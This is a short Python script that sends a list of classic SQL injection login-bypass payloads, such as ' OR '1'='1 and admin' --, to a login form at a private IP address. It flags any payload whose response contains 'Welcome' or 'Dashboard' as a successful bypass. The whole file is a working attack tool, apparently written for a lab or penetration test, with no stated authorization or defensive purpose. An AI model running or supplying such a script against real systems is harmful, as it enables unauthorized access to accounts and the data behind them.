import requests

url = "http://192.168.1.100/login.php"

# Basic SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR 'a'='a",
    "' OR 'x'='x' --",
    "admin' --",
    "admin' #",
]

for payload in payloads:
    data = {
        'username': payload,
        'password': 'password123'
    }
    response = requests.post(url, data=data)

    if "Welcome" in response.text or "Dashboard" in response.text:
        print(f"[+] Potential SQL Injection successful with payload: {payload}")
    else:
        print(f"[-] Payload failed: {payload}")

